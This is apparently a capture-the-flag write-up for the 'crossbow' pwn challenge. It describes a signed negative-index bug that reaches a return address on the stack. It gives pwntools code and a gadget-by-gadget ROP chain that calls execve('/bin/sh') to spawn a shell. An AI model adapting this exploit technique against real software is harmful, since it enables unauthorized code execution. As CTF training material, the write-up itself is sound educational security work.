# crossbow

**Category:** Pwn  
**Challenge Name:** crossbow  
**Tools:** pwntools, Ghidra, objdump, ROPgadget

---

## Goal

Exploit a buffer overflow in a menu-based binary by passing a negative index, and construct a full ROP chain to execute `execve("/bin/sh", NULL, NULL)`.

---

## How I Solved It

### 1. Vulnerability — Signed Index Abuse

The binary prompts:
```
Select target to shoot:
```

Internally, the user input is likely used to access an array (e.g., `targets[index]`). However, no bounds checking is done, and the index is **signed**.

By sending `-2`, we access memory *before* the intended buffer, at a return address on the stack.

```python
pr.sendlineafter(b"Select target to shoot:", b"-2")
```
This creates a primitive to overwrite the return address.

### 2. ROP Chain Strategy

Using known gadgets and a writable memory region, I construct a ROP chain to:
- Write `/bin/sh` to a known location in memory (.bss, here at `0xe000`).
- Set `rdi`, `rsi`, `rdx` appropriately.
- Set `rax` to 59 (`execve` syscall number).
- Trigger `syscall`.

This results in executing:
```python
execve("/bin/sh", NULL, NULL);
```

### 3. ROP Chain Breakdown

All gadgets are rebased relative to the image base (`0x400000`):
```python
rebase = lambda x: pack('Q', x + IMAGE_BASE_0)
```
ROP chain:
```python
rop = b''
rop += rebase(0x1001)      # pop rax; ret;
rop += b'/bin/sh\x00'      # string to write
rop += rebase(0x1d6c)      # pop rdi; ret;
rop += rebase(0xe000)      # writable address
rop += rebase(0x20f5)      # mov [rdi], rax; ret;
rop += rebase(0x1d6c)      # pop rdi; ret;
rop += rebase(0xe000)      # pointer to "/bin/sh"
rop += rebase(0x566b)      # pop rsi; ret;
rop += p(0x0)              # rsi = NULL
rop += rebase(0x1139)      # pop rdx; ret;
rop += p(0x0)              # rdx = NULL
rop += rebase(0x1001)      # pop rax; ret;
rop += p(0x3b)             # rax = 59 (execve)
rop += rebase(0x4b51)      # syscall; ret;
```
This is written after 8 bytes of padding (the offset to `RIP`), using:
```python
payload = flat(b"A" * 8, rop)
```

### 4. Exploitation

We send the crafted payload at the prompt that appears after targeting:
```python
pr.sendlineafter(b"> ", payload)
```
When the vulnerable function returns, execution jumps to our ROP chain. A shell is spawned.

---

You can find the full exploit script in [`main.py`](./main.py).
